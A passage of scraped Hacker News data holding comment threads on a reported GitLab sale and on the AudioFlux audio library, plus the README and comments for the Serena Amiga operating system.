helped them (their bottom line, growth, brand, sustainability, or some combination of these)? reply trueismywork 13 hours agoparentprevMonopoly laws are not strong enough reply cholantesh 4 hours agorootparentThis is the real answer. reply alberth 14 hours agoparentprevIn tech, adoption follows a Power Law curve. If you’re not the top 1 (or 2) in what you do, your fighting for extremely small slices of market share. reply wmf 14 hours agorootparentGitlab is #2, right? reply pas 4 hours agorootparentYes. But the first is a trillion dollar gorilla. And lot of people still use AWS code whatever. There's probably not much money in just hosting code (especially considering that the market has been \"commoditized to death\" by ... GitLab itself, among others). reply tourmalinetaco 14 hours agorootparentprevIt truly is a shame legal ramifications for monopolizations of major markets has fallen so far behind. reply cortesoft 14 hours agoparentprevIt tends to go in cycles, with phases where companies are merged into conglomerates and then phases where parts are spun off into separate companies. There are various reasons for both parts of the cycle. reply blackeyeblitzar 14 hours agoparentprevMegacorps are too powerful and have the ability to spend to get to low costs and high margins. They can also spend heavily and take losses for years in search of that efficient mature product. Then there’s all the blatantly anti competitive stuff like bundling things into existing contracts. Nothing will fix the consolidation unless we talk about this more and change the law. It’s not healthy for society to be controlled by a government and a handful of too big to fail companies. reply seydor 13 hours agoparentprevin the beginning, the universe is a soup of particles with small density variations, over time things pull apart, giant stars form and consume more matter, giant galaxies, expanding away from each other more and more. reply sebastiennight 14 hours agoprevAs a small startup I know I'm not really their core buyer, but I absolutely love Gitlab. It's a bit worrying to think about the impact a purchase/merger might have on the product. What the article doesn't make clear is how much of the company capital is public? If the founder owns 45% of voting shares and Google/Alphabet has 22%, are only 33% of the shares actually on the public markets? reply pas 4 hours agoparentYes. So in effect this means that - conditional on the bylaws - they (a coalition of majority shareholders) can agree to deals without doing (proxy) votes. But since it's a public company the deal has to be fair to all (!) shareholders too. (And usually that's why a vote is \"nice to have\", but not sufficient. See the case of Tesla and Elon's compensation package, where laws protecting those who voted no on the package will override the shareholder vote. [thought it's pending appeal, etc.]) reply dijit 13 hours agoprevGitlabs increased revenues are only due to price hiking and removing of lower tiers. For example my bill with no additional needed features has risen from 6€ per user per month or so to €29 in something like 2-3 years. I’m sure any serious buyer would look through that and realise some major churn is about to happen as renewals hit. - especially as they will be wanting customer/rev growth. reply pas 4 hours agoparentsure, but DataDog is a professional extortist, they know what they are buying (if they are in fact buying) :) reply rr808 15 hours agoprevDoes Datadog have a good remote policy? Will be interesting to see if any acquirer keeps it long term. edit: I guess they do https://careers.datadoghq.com/remote/ reply cheepin 14 hours agoparentI recently had a recruiter from them email for hybrid positions with no remote so take that as you will Edit: 15 remote engineering positions open out of 219 total on their career site reply toomuchtodo 15 hours agoparentprevGood fit considering they’ve both embraced remote, preventing potential value destruction by an acquirer. DataDog also going big into cloud security recently with product releases, so perhaps a more engineering/dev focused Wiz “grow and roll up” play. DataDog and Gitlab combined would be worth almost $45B. reply tapoxi 14 hours agorootparentBut their products are quite different. There's a large market that self-hosts GitLab for data soverignity reasons, and Datadog has no such offering. I'm a GitLab user, I can't use Datadog because our customer contracts forbid data leaving the system (PHI, BAA won't suffice). I would reconsider GitLab if they were acquired. reply werrett 14 hours agorootparentOut of interest -- Why put PHI in your SCM? If you're just wrangling code but not actual data SaaS should be kosher. reply tapoxi 7 hours agorootparentWe don't put PHI in repos, the CI platform has access to the infrastructure to deploy, which means any potential compromise would expose PHI. reply moralestapia 15 hours agorootparentprevM&A w/ Bitbucket could also be interesting. I don't dislike Github but prefer Bitbucket, I feel they're a bit underappreciated, in part due to the massive market share that Github has. This could help turn things around. reply physicsguy 10 hours agoprevI like GitLab's product but I don't like the developments they've made in the last few years. It seemed to me to have been captured by too many product managers trying to make a name for themselves and became less of a cohesive user interface/feature set. The cost kept going up as they hired more and more people. reply jmclnx 4 hours agoprevGreat, I just moved my items to gitlab. I wonder how long the new owners will add AI, Copilot, 2FA and other crap to their site. I went github -> back to RCS and anon ftp -> just now to gitlab I guess it is back to RCS and anon ftp. FWIW, I would expect IBM to grab gitlab if it is really up for sale. reply pyeri 15 hours agoprevNot a good development, some competition is always good in this space. reply moltar 9 hours agoprevI think AWS should buy it. Given they just deprecated CodeCommit. reply okokwhatever 9 hours agoparentInsightful reply alanwreath 13 hours agoprevI wonder what it means to the government use of it. Every government entity I’ve seen thus far uses gitlab. And I’m guessing because self hosting critical. reply lrvick 8 hours agoprevSelf host Forgejo and truck on with all the same features in a tiny footprint. Gitlab has always been massive bloat that takes way too many people to maintain, and way too many resources to deploy. Not to mention proprietary feature gating that is a major turn-off to community contributions. reply nabeards 6 hours agoparentDoes Forgejo use git? It’s not obvious from the ‘what is forgejo?’ documentation. reply majewsky 4 hours agorootparentYes. Forgejo is a fork of Gitea. reply NewJazz 12 hours agoprevI really hope they don't sell. They really fucked up their pricing. There is such a steep cliff to climb these days. Literally starts at $30/user/month. You can almost get GitHub enterprise and Copilot for that price. But their open core model, fully remote organizational structure, and overall product quality is highly valuable. How many open source distros self-host GitLab? Debian, Arch, Alpine, postmarketOS, any I'm missing? Then GNOME, KDE, and free desktop have their own instances. How many companies self-host or use gitlab.com? There is real value and momentum there. Would be a shame to succumb to impatience and AI frenzy. I doubt datadog can steward the project in the same way. reply HexDecOctBin 14 hours agoprevIs there any self-hostable software that supports both Git and SVN? reply Lammy 12 hours agoparentPhorge https://we.phorge.it/ Also supports Hg. reply Dunedan 13 hours agoparentprevThere is also git-as-svn, which provides access to a git repository through SVN: https://git-as-svn.github.io/git-as-svn/htmlsingle/git-as-sv... reply Stuffing6410 13 hours agoparentprevScm-manager [https://scm-manager.org/] reply NetOpWibby 14 hours agoparentprevSourceHut, I think. reply mv4 4 hours agoprevCompanies are bought, not sold. reply wtcactus 12 hours agoprevI've worked - like everyone else here, I believe - extensively with GitHub in the past, as it was the de facto standard 1 decade ago. Then, about 5 years ago I started working in a company that went the GitLab way, specifically due to the CI/CD support they provided directly in the platform. At first, I didn't like the change so much, but as the project kept going, and we invested more and more in CI/CD, I can't see any going back. There's just nothing in GitHub that would allow us this kind of control and flexibly and automation over the build/testing/release process. I get it if for your own personal development you prefer GitHub (I still do), but for anything of a medium/big size that's willing to invest time and money into a fully automated release process, GitLab is the way. And I guess that's where the value of GitLab to investors lies, in its appeal to the enterprise sector. reply layer8 11 hours agoparentNot everyone works extensively with GitHub, especially outside SV culture. I only do when I must. reply Meluhan 15 hours agoprevNo IBM? reply davidandgoliath 14 hours agoprevAnyone is contemplating this should sincerely reconsider. reply veltas 13 hours agoprevMany companies have no choice but to self-host to comply with export control regulations. We use GitLab and drool over GitHub the whole time. But this is one advantage for GitLab, fundamentally we won't use GitHub because we need to control the data ourselves. Think for example of the defence industry, it's a big deal. reply mcpherrinm 13 hours agoparentGitHub has a self-hosted version of their enterprise product for that market: https://docs.github.com/en/enterprise-server@3.14/admin/over... reply brnt 10 hours agorootparentWhat does that get you over Gitlab CE? reply hoofhearted 9 hours agorootparentYou can self host it on your own stack and subdomain; completely segmented away from the public GitHub application. reply brnt 8 hours agorootparentThe question was what it gets you over Gitlab CE. reply LarsDu88 13 hours agoprev [–] At my last job, I joined right when the company switched from Github to Gitlab. That right there should've been a massive red flag reply guappa 12 hours agoparent [–] You think companies make money when everyone has to take a nap because github is down as usual? reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "GitLab is reportedly up for sale, with interest from buyers like cloud monitoring firm Datadog, and is valued at approximately $8 billion.",
      "The company, used by over half of the Fortune 100, saw a 7% surge in shares following the news, reflecting investor optimism despite competition and pricing pressures.",
      "Founder Sid Sijbrandij's 45.51% voting stock complicates potential deals, amid a broader trend of M&A activity in the tech sector, which saw $327.2 billion in deals in the first half of 2024."
    ],
    "commentSummary": [
      "Gitlab is reportedly up for sale, raising concerns about potential changes and layoffs among its user base.",
      "Users are divided, with some preferring GitHub for its stability and AI focus, while others value Gitlab's all-in-one project management and continuous integration (CI) features.",
      "The potential sale has sparked worries about the future of Gitlab's community edition and the possibility of user departure, especially from those who chose Gitlab to avoid Microsoft."
    ],
    "points": 148,
    "commentCount": 163,
    "retryCount": 0,
    "time": 1723517715
  },
  {
    "id": 41235462,
    "title": "AudioFlux: A C/C++ library for audio and music analysis",
    "originLink": "https://github.com/libAudioFlux/audioFlux",
    "originBody": "audioFlux audioflux is a deep learning tool library for audio and music analysis, feature extraction. It supports dozens of time-frequency analysis transformation methods and hundreds of corresponding time-domain and frequency-domain feature combinations. It can be provided to deep learning networks for training, and is used to study various tasks in the audio field such as Classification, Separation, Music Information Retrieval(MIR) and ASR etc. New Features v0.1.8 Add a variety of Pitch algorithms: YIN, CEP, PEF, NCF, HPS, LHS, STFT and FFP. Add PitchShift and TimeStretch algorithms. Table of Contents Overview Installation Python Package Install Other Build Quickstart Benchmark Documentation Contributing Citing License Overview audioFlux is based on data stream design. It decouples each algorithm module in structure, and can quickly and efficiently extract features of multiple dimensions. The following is the main feature architecture diagram. You can use multiple dimensional feature combinations, select different deep learning networks training, study various tasks in the audio field such as Classification, Separation, MIR etc. The main functions of audioFlux include transform, feature and mir modules. 1. Transform In the time–frequency representation, main transform algorithm: BFT - Based Fourier Transform, similar short-time Fourier transform. NSGT - Non-Stationary Gabor Transform. CWT - Continuous Wavelet Transform. PWT - Pseudo Wavelet Transform. The above transform supports all the following frequency scale types: Linear - Short-time Fourier transform spectrogram. Linspace - Linspace-scale spectrogram. Mel - Mel-scale spectrogram. Bark - Bark-scale spectrogram. Erb - Erb-scale spectrogram. Octave - Octave-scale spectrogram. Log - Logarithmic-scale spectrogram. The following transform are not supports multiple frequency scale types, only used as independent transform: CQT - Constant-Q Transform. VQT - Variable-Q Transform. ST - S-Transform/Stockwell Transform. FST - Fast S-Transform. DWT - Discrete Wavelet Transform. WPT - Wave Packet Transform. SWT - Stationary Wavelet Transform. Detailed transform function, description, and use view the documentation. The synchrosqueezing or reassignment is a technique for sharpening a time-frequency representation, contains the following algorithms: reassign - reassign transform for STFT. synsq - reassign data use CWT data. wsst - reassign transform for CWT. 2. Feature The feature module contains the following algorithms: spectral - Spectrum feature, supports all spectrum types. xxcc - Cepstrum coefficients, supports all spectrum types. deconv - Deconvolution for spectrum, supports all spectrum types. chroma - Chroma feature, only supports CQT spectrum, Linear/Octave spectrum based on BFT. 3. MIR The mir module contains the following algorithms: pitch - YIN, STFT, etc algorithm. onset - Spectrum flux, novelty, etc algorithm. hpss - Median filtering, NMF algorithm. Installation The library is cross-platform and currently supports Linux, macOS, Windows, iOS and Android systems. Python Package Install To install the audioFlux package, Python >=3.6, using the released python package. Using PyPI: $ pip install audioflux Using Anaconda: $ conda install -c tanky25 -c conda-forge audioflux Other Build iOS build Android build Building from source Quickstart Mel & MFCC CWT & Synchrosqueezing CQT & Chroma Different Wavelet Type Spectral Features Pitch Estimate Onset Detection Harmonic Percussive Source Separation More example scripts are provided in the Documentation section. Benchmark server hardware: - CPU: AMD Ryzen Threadripper 3970X 32-Core Processor More detailed performance benchmark are provided in the Benchmark module. Documentation Documentation of the package can be found online: https://audioflux.top Contributing We are more than happy to collaborate and receive your contributions to audioFlux. If you want to contribute, please fork the latest git repository and create a feature branch. Submitted requests should pass all continuous integration tests. You are also more than welcome to suggest any improvements, including proposals for need help, find a bug, have a feature request, ask a general question, new algorithms. Open an issue Citing If you want to cite audioFlux in a scholarly work, please use the following ways: If you are using the library for your work, for the sake of reproducibility, please cite the version you used as indexed at Zenodo: License audioFlux project is available MIT License.",
    "commentLink": "https://news.ycombinator.com/item?id=41235462",
    "commentBody": "AudioFlux: A C/C++ library for audio and music analysis (github.com/libaudioflux)130 points by CMLab 5 hours agohidepastfavorite32 comments jcelerier 4 hours agoIt would be nice to have a comparison with any of the many C++ MIR (music information retrieval) libraries in the wild: - https://essentia.upf.edu/ - https://github.com/marsyas/marsyas - https://github.com/ircam-ismm/pipo - https://github.com/flucoma/flucoma-core/tree/main/include/al... reply BrannonKing 1 hour agoparentIf a person wanted to transcribe sheet music from recorded audio, do you know which library and features would be the best starting point? reply bravura 55 minutes agorootparentI have had mixed luck with this model, which is supposedly state-of-the-art: https://github.com/magenta/mt3 What kind of music are you trying to transcribe? Feel free to email me. reply bckr 1 hour agorootparentprevStart with source separation using demucs reply bravura 4 hours agoprevIf this is supposed to be used for deep-learning, shouldn't all the transforms be GPU-accelerated torch functions? reply tgv 4 hours agoparentBy the looks of it, those functions extract features (like frequency peaks). You do that once for a sound. The output could function as input for an NN, in which case it would be a tokenizer for sound. reply bravura 3 hours agorootparentGiven what I've seen in audio ML research: 1) Tuning hyperparameters of your audio preprocessing is a pain if it's a preprocessed CPU step. You have to redo preprocessing every time you want to tune your audio feature hyperparams 2) It's quite common to use torchaudio spectrograms, etc. purely because they are faster (I can link to a handful of recent high-impact audio ML github repos if you like) 3) If you use nnAudio, you can actually backprop the STFT or mel filters and tune them if you like. With that said, this is not so commonplace. 4) Sometimes the audio is GENERATED by a GPU. For example, in a neural vocoder, you decode the audio from a mel to a waveform. Then, you compute the loss over the true versus predict audio mel spectrograms. You can't do this with these C++ features. (Again, I can link a handful of recent high-impact audio ML github repos if you like.) Again, I just don't get it. reply tgv 2 hours agorootparentBackpropping filter coefficients sounds clever, but can't you just do that on any layer that takes a spectrum as input? reply bravura 57 minutes agorootparentBackpropping filter coefficients is clever, but it hasn't really caught on much. Google also tried with LEAF (https://github.com/google-research/leaf-audio) to have a learnable audio filterbank. Anyway, in audio ML what is very common is: a) Futzing with the way you do feature extraction on the input. (Oh, maybe I want CQT for this task or a different scale Mel etc) b) Doing feature extraction on generated audio output, and constructing loss functions from generated audio features. So, as I said, I don't exactly see the utility of this library for deep learning. With that said, it is definitely nice to have really high speed low latency audio algorithms in C++. I just wouldn't market it as \"useful for deep learning\" because a) during training, you need more flexibility than non-GPU methods without backprop b) if you are doing \"deep learning\" then your inferred model will presumably be quite large, and there will be a million other things you'll need to optimize to get real-time inference or inference on CPUs to work well. Is just my gut reaction. It seems like a solid project, I just question the one selling point of \"useful for deep learning\" that's all. reply codetrotter 3 hours agorootparentprev> I can link to a handful of recent high-impact audio ML github repos if you like Yes please :D reply bravura 2 hours agorootparentFor instance: https://github.com/descriptinc/descript-audio-codec/blob/mai... https://github.com/NVIDIA/BigVGAN/blob/main/loss.py#L23 https://arxiv.org/pdf/2210.13438 (the github repo doesn't include training, just inference) It is INCREDIBLY common to use multi-scale spectral loss as the audio distance / objective measure in audio generation. They have some issues (i.e. they aren't always well correlated with human perception) but they are the known-current-best. reply herogary 4 hours agoparentprevMaybe for the convenience of mobile usage? reply dsego 4 hours agoprevIt's also for Python, I just discovered it a few days ago. This is the website https://audioflux.top/ reply BrannonKing 1 hour agoprevSo are they going for feature parity with librosa? I think that would be great. reply nesarkvechnep 4 hours agoprevWhat's this C/C++ language? reply n4r9 3 hours agoparentSome preliminary analysis suggests that if C is an integer greater than 1, C/C++ will always evaluate to 1 [0]. [0] https://www.programiz.com/online-compiler/9fkHTct0Mybpu reply iExploder 1 hour agoparentprevmean you are using C++ but only the features that dont suck, so probably 10% of the language, rest is plain C reply troymc 3 hours agoparentprev1/++ reply rossant 2 hours agorootparentor 1++ if you got your C operator precedence wrong reply dekken_ 4 hours agoprevIt's C and Python, not C++ reply textlapse 1 hour agoparentAll squares are rectangles I guess. reply dsego 4 hours agoparentprevC can be used in C++ code, no? reply epcoa 3 hours agorootparentIt is true that there is C code that is conforming C++ code. However I would say if you’re using a C compiler with with “extern C” in the headers for C++ linker compatibility (as this library does) then saying C++ is about as misleading as saying a Rust library is C++ as you can link to that too. As far as compatibility and “history” the languages are different enough now. There are both: features in C that do not exist in C++, and code that is conforming C that would be UB in C++. Saying C/C++ (for real) is usually a dumb target when it’s better to pick one and settle with that. If it’s C, just say so. Everyone knows what extern C is, you don’t need to confuse. reply leonardohn 3 hours agorootparentEven Pascal is closer to C than C++ is, yet historically people use this term implying they are very close. reply Galanwe 4 hours agorootparentprevSomething very close, but that's not what you would expect for something that markets itself as a C++ library IMHO. Especially in 2024, most people would hope (or assume) that \"C++\" means \"C++ 11\" at least. Definitely doesn't count as _lying_, but still underwhelming. reply dekken_ 4 hours agorootparentprevDepends, not all C is C++, eg, there is no (yet) `restrict` keyword in C++ (even if lots of C++ compilers support __restrict__, it's not in the spec) reply bregma 3 hours agorootparentprevYes. And C can also be used with Python and Rust. That does not make this a Rust library. reply dsego 3 hours agorootparentRight, but C++ started as an extension of C and is mostly compatible and historically you could compile C with the C++ compiler. I don't think it's a good comparison. reply codetrotter 3 hours agorootparentZig can compile C. That makes this C/C++/Zig library. Right? :^) reply jcelerier 3 hours agorootparentprev> historically you could compile C with the C++ compiler. not any C, only the C++-compatible subset. int* foo = malloc(sizeof(int)); has never worked in C++ for instance while it's valid C. Code that worked is code that people actually did effort to express in a way compatible with a C++ compiler. reply gosub100 2 hours agoprevCan this be used for audio fingerprinting? reply morning-coffee 2 hours agoprev [–] Do you have one in safe Rust? See, we've only just met, and I don't know how you handle your ptr/len arguments in C just yet. ;) reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "audioFlux is a deep learning tool library for audio and music analysis, supporting tasks like Classification, Separation, Music Information Retrieval (MIR), and Automatic Speech Recognition (ASR).",
      "The latest version, v0.1.8, introduces new Pitch algorithms (e.g., YIN, CEP) and algorithms for PitchShift and TimeStretch.",
      "It supports various platforms (Linux, macOS, Windows, iOS, Android) and can be installed via PyPI or Anaconda, with comprehensive documentation and performance benchmarks available online."
    ],
    "commentSummary": [
      "AudioFlux is a C/C++ library designed for audio and music analysis, available on GitHub.",
      "Users are discussing its comparison with other Music Information Retrieval (MIR) libraries like Essentia, Marsyas, PiPo, and Flucoma.",
      "The library is noted for its solid performance but lacks flexibility and GPU support, making it less ideal for deep learning applications."
    ],
    "points": 130,
    "commentCount": 32,
    "retryCount": 0,
    "time": 1723557087
  },
  {
    "id": 41233811,
    "title": "Serena: An experimental operating system for 32bit Amiga computers",
    "originLink": "https://github.com/dplanitzer/Serena",
    "originBody": "About The Project Serena is an experimental operating system based on modern design principles with support for pervasive preemptive concurrency and multiple users. The kernel is object-oriented and designed to be cross-platform and future proof. It runs on Amiga systems with a 68030 or better CPU installed. One aspect that sets it aside from traditional threading-based OSs is that it is purely built around dispatch queues somewhat similar to Apple's Grand Central Dispatch. There is no support for creating threads in user space nor in kernel space. Instead the kernel implements a virtual processor concept where it dynamically manages a pool of virtual processors. The size of the pool is automatically adjusted based on the needs of the dispatch queues and virtual processors are assigned to processes as needed. All kernel and user space concurrency is achieved by creating dispatch queues and by submitting work items to dispatch queues. Work items are simply closures (a function with associated state) from the viewpoint of the user. Another interesting aspect is interrupt handling. Code which wants to react to an interrupt can register a counting semaphore with the interrupt controller for the interrupt it wants to handle. The interrupt controller will then signal the semaphore every time the interrupt occurs. Use of a counting semaphore ensures that the code which is interested in the interrupt does not miss the occurrence of an interrupt. The advantage of translating interrupts into signals on a semaphore is that the interrupt handling code executes in a well-defined context that is the same kind of context that any other kind of code runs in. It also gives the interrupt handling code more flexibility since it does not have to immediately react to an interrupt. The information that an interrupt has happened is never lost, whether the interrupt handler code happened to be busy with other things at the time of the interrupt or not. The kernel is generally reentrant. This means that virtual processors continue to be scheduled and context switched preemptively even while the CPU is executing inside the kernel. Additionally a full compliment of counting semaphores, condition variables and lock APIs are available inside the kernel. The API of those objects closely resembles what you would find in a user space implementation of a traditional OS. Serena implements a hierarchical process structure similar to POSIX. A process may spawn a number of child processes and it may pass a command line and environment variables to its children. A process accesses I/O resources via I/O channels which are similar to file descriptors in POSIX. There are two notable differences between the POSIX style process model and the Serena model though: first instead of using fork() followed by exec() to spawn a new process, you use a single function in Serena called Process_Spawn(). This makes spawning a process much faster and significantly less error prone. Secondly, a child process does not inherit the file descriptors of its parent by default. The only exception are the file descriptors 0, 1 and 2 which represent the terminal input and output streams. This model is much less error prone compared to the POSIX model where a process has to be careful to close file descriptors that it doesn't want to pass on to a child process before it spawns a child. Doing this was easy in the early days of Unix when applications were pretty much self contained and when there was no support for dynamic libraries. It's the opposite today because applications are far more complex and depend on many 3rd party libraries. The executable file format at this time is the Atari ST GemDos file format which is a close relative to the aout executable format. This file format will be eventually replaced with a file format that will be able to support dynamic libraries. However for now it is good enough to get the job done. The kernel implements SerenaFS which is a hierarchical file system with permissions and user and group information. A file system may be mounted on top of a directory located in another file system to expand the file namespace. All this works similar to how it works in POSIX systems. A process which wants to spawn a child process can specify that the child process should be confined to a sub-tree of the global file system namespace. The boot file system is currently RAM-based. The ROM contains a disk image which is created with the diskimage tool and which serves as a template for the RAM disk. This ROM disk image is copied to RAM at boot time. User space has support for libc, libsystem, libclap and the very beginnings of libm. Libsystem is a library that implements the user space side of the kernel interface. Libclap is a library that implements argument parsing for command line interface programs. Serena OS comes with a shell which implements a formally defined shell language. You can find the shell document here. Features The following kernel services are implemented at this time: Kernel and user space separation in the sense of code privilege separation (not memory space separation) Dispatch queues with execution priorities Virtual processors with priorities and pervasive preemptive scheduling Interrupt handling with support for direct and semaphore-based interrupt handling Simple memory management (no virtual memory support yet) In-kernel object runtime system (used for drivers and file systems) Hierarchical processes with support for command line arguments, environment variables and I/O resource descriptor inheritance Hierarchical file system structure with support for mounting/unmounting file systems The SerenaFS file system Support for ROM and RAM-based disks Support for aout/GemDos executables Support for pipes Floppy disk driver Monotonic clock Repeating timers Counting semaphores, condition variables and locks (mutexes) Zorro II and III expansion board detection and enumeration Event driver with support for keyboard, mouse, digital Joystick, analog joystick (paddles) and light pens Simple graphics driver (not taking advantage of the Blitter yet) VT52 and VT100 series compatible interactive console The following user space services are available at this time: A system library with support for processes, dispatch queues, time and file I/O C99 compatible libc Beginnings of a C99 compatible libm libclap command line interface argument parsing library The following user space programs are available at this time: An interactive shell with command line editing and history support The level of completeness and correctness of the various modules varies quite a bit at this time. Things are generically planned to improve over time :) Supported Hardware The following hardware is supported at this time: Amiga 2000, 3000 and 4000 motherboards Newer than the original chipsets work, but their specific features are not used Motorola 68030, 68040 and 68060 CPU. Note that the CPU has to be at least a 68030 class CPU Motorola 68881 and 68882 FPU Standard Commodore Amiga floppy drive Zorro II and Zorro III memory expansion boards Getting Started Setting the project up for development and running the OS is a bit involved. The instructions below are for Windows but they should work pretty much the same on Linux and macOS. Prerequisites The first thing you will need is an Amiga computer emulator. I'm using WinUAE which you can download from https://www.winuae.net/download Download the WinUAE installer and run it. This will place the emulator inside the 'Program Files' directory on your boot drive. Next download and install the VBCC compiler and assembler needed to build the operating system. You can find the project homepage is at http://www.compilers.de/vbcc.html and the download page for the tools at http://sun.hasenbraten.de/vbcc. The version that I'm using for my development and that I know works correctly on Windows 11 is 0.9h. Be sure to add an environment variable with the name VBCC which points to the VBCC folder on your disk and add the vbcc\\bin folder to the PATH environment variable. Note that you need to have Microsoft Visual Studio and command line tools installed because the Microsoft C compiler is needed to build the build tools on Windows. Finally install GNU make for Windows and make sure that it is in the PATH environment variable. A straight-forward way to do this is by executing the following winget command in a shell window: winget install GnuWin32.Make. Building the Build Tools You only need to execute this step once and before you try to build the OS. The purpose of this step is to build a couple of tools that are needed to build the kernel and user space libraries. You can find documentation for these tools here. First open a Developer Command Prompt in Windows Terminal and then cd into the Serena/Tools folder. Type make and hit return. This will build all required tools and place them inside a Serena/build/tools folder. The tools will be retained in this location even if you do a full clean of the OS project. Building the Operating System Open the Serena project folder in Visual Studio Code and select Build All from the Run Build Task... menu. This will build the kernel, libsystem, libc, libm and shell and generate a single Serena.rom file inside the Serena/product/Kernel/ folder. This ROM file contains the kernel, user space libraries and the shell. Running the Demo First you'll need to create an Amiga configuration with at least a 68030 CPU (i.e. Amiga 3000 or 4000) in WinUAE if you haven't already. The easiest way to do this is by going to Quickstart and selecting A4000 as the model. Then go to the Hardware/ROM page and update the \"Main ROM file\" text field such that it points to the Serena.rom file inside the Serena/build/product/ folder on your disk. Finally give your virtual Amiga at least 1MB of Fast RAM by going to the Hardware/RAM page and setting the \"Slow\" entry to 1MB. Save this configuration so that you don't have to recreate it next time you want to run the OS. Load the configuration and then hit the Start button or simply double-click the configuration in the Configurations page to run the OS. The emulator should open a screen that shows a boot message and then a shell prompt. See the shell page for a list of commands that are supported by the shell. License Distributed under the MIT License. See LICENSE.txt for more information. Contact Dietmar Planitzer - @linkedin Project link: https://github.com/dplanitzer/Serena",
    "commentLink": "https://news.ycombinator.com/item?id=41233811",
    "commentBody": "Serena: An experimental operating system for 32bit Amiga computers (github.com/dplanitzer)127 points by doener 9 hours agohidepastfavorite38 comments sbarre 6 hours agoThis is fascinating. I love the virtual processors dispatch queue concept (new to me) and I think I found my lunch reading for today. I also immediately went to eBay to see how much old Amiga computers cost, and.... Wow, they are pretty much not available? All I could find was parts listings, and the odd \"mainboard as-is\" for like $1,000 or more... I had no idea Amiga computers from the 90s were so rare now. reply actionfromafar 6 hours agoparentThey are more common in Europe, since they sold better there. (Except the Amiga 1000.) There are also several reimplementations, either with FPGA or \"real\" 680x0 CPUs. This Serena operating system fascinates me in several ways. I have said it before, but I think one very cool thing about the Amigas is how they are the missing link between \"too simple\" 8-bit and 16-bit DOS computers and our modern computers. They are advanced enough to run modern(-ish) software and simple enough to be reimplemented faithfully several times over by various projects. reply icedchai 5 hours agorootparentThe Amiga was my first exposure to a computer with a \"real\" OS: tasks/processes, memory management, IPC, shared libraries, etc. I first learned C on an Amiga. It also taught me to be careful: a bug in your program with no memory protection would often mean a crash/reboot (\"Guru Meditation\" error.) reply blueflow 4 hours agorootparentWhere does that come from that a fraction of computing history is dismissed as \"not a real OS\" ? Did \"real\" OS's exist for the IBM PC? reply hub_ 3 hours agorootparentOS/2 comes to mind. Version 1.x was already much more sophisticated than MS-DOS. reply pjmlp 3 hours agorootparentAnd Xenix. reply blueflow 3 hours agorootparentFor you two: The IBM PC was the first PC and had a 8088 CPU. OS/2 and Xenix were for the 286 and up. If you make virtual memory a necessary attribute to qualify as OS, there were no OS for the original IBM PC as the 8088 had no support for virtual memory. That's why my (tricky) question. reply pjmlp 2 hours agorootparentMy first computer was a Timex 2068, while at the school lab we had Amstrad PC1512 with 5\" floppies and no HD... Naturally when we speak about PC, we don't mean the original IBM PC and nothing else. reply hnlmorg 32 minutes agorootparentIf we are being pedantic then what you’re describing are called IBM-compatible PCs. Ie they weren’t made by IBM but were designed to support most other of the same software. reply blueflow 4 minutes agorootparentprevYes and i said \"IBM PC\"... icedchai 2 hours agorootparentprevAmiga OS didn't have virtual memory either. reply bpoyner 2 hours agorootparentprevXenix .. that brings back memories of green screens and digicards (digiboards). reply icedchai 3 hours agorootparentprevI put real in quotes. I probably should've said \"OS of sufficient level of complexity.\" reply blueflow 3 hours agorootparentOr name the features directly: \"my first OS with multitasking and memory management\" reply icedchai 2 hours agorootparentI did name the features directly. reply galangalalgol 5 hours agorootparentprevI have the a1000 I learned on as a kid. And the c64 from before that, but I keep saying here that the 32bit microcontrollers are fairly close approximations that use less power and have more processing. You can't get bloat though because they still have ram constraints tied to the mmu that can only do page protection, just like the amiga... Could even use the DACs to spit out s-video maybe? reply gxd 5 hours agoparentprevThere is no reason to get the original unless you're a committed retrocomputing enthusiast or collector (I am a retro games collector and decided against getting an original anyway). You can get an exceptional emulation experience using WinUAE or https://www.amigaforever.com/ (which is also WinUAE based). reply teo_zero 4 hours agoparentprev> I also immediately went to eBay to see how much old Amiga computers cost Please note that Serena targets a Motorola 68030, so anything below an Amiga 3000 won't qualify. reply ekianjo 3 hours agorootparentwould that work with a A1200 equipped with an acceleration board? reply sgt 40 minutes agorootparentYes it will, I have an Amiga 1200 with a Blizzard 1230IV accelerator board. They were super common back in the day. Its 68030 runs at a whopping 50MHz, so you pretty much have to wear a seatbelt. reply pjmlp 3 hours agoparentprevWe loved them, a great gaming computer, multitasking, already had sound and graphics chips we could program for, multitasking (although Guru Meditation could happen quite frequently), an extensible OS with plugins, dynamic libraries, scriptable applications. Meanwhile on PC land, Windows 3.x had just come up into the scene. As the only PC guy on our group, I really enjoyed the demoscene meetings where I could improve my Amiga skills. reply guestbest 3 hours agoparentprevShipping is prohibitively expensive including UPS and just like 15 year old flat screen televisions, sellers will rip out components to cut down on costs. I once saw a horse saddle get shipped to Argentina from Texas for 36 dollars through UPS in 2004 in a flimsy cardboard box. I can’t imagine the cost these days reply _joel 6 hours agoparentprevThat ship sailed quite some time ago, it seems. At least for OG, unless you want to spend large amounts. I wish I'd kept my 500+ now too. reply icedchai 6 hours agorootparentTell me about it! I had both an A500 and A3000 in the 90's. I sold both for a pittance... reply sgt 38 minutes agorootparentI also have regrets. You know, one time I had a 1084S Commodore monitor - pristine condition. One day it didn't want to turn on, and after a few weeks I just threw it in the trash. So ... incredibly stupid! People like me should get the death penalty. reply InsideOutSanta 6 hours agorootparentprevMy mom gave my Amiga 500 away when I was on holidays. reply sbarre 6 hours agorootparentOof.. I feel that pain, we had an Apple IIe that I taught myself to program on in the 80s, it was basically the genesis of my life and career, and oddly enough kind of a family heirloom for me.. When I left for university in the early 90s, my dad donated it to a local library without even asking me first. To be fair I had never expressed my desired to keep it, it was just in the basement in a box. So it wasn't that big of a deal but I know he feels guilt for that one to this day, once I explained how I felt. reply morning-coffee 5 hours agorootparentOuch. I feel for you both. I count myself lucky... I still have my IBM PC XT in the basement (runs and my son plays Zork II on it) thanks to my Dad not only shelling out for it in 1983 but hanging on to it over the years. But I empathize for other reasons... my Mom gave away my huge bag of Legos, including all the cool Space stuff, that I wish I still had. ;) reply christkv 50 minutes agoparentprevI’ve been eyeing the vampire v4 standalone. FPGA reimagining of the amiga with backwards compatibility reply doener 6 hours agoprevVia http://www.amiga-news.de/de/news/AN-2024-08-00046-DE.html (in German) reply cturner 6 hours agoprevStefany is not advertising them for sale at the moment, but is still working on a 68040/48060 platform in the background. https://c256foenix.com/a2560x/?v=6cc98ba2045f If you are looking for an audience for your platform, you may want to connect to that community via their 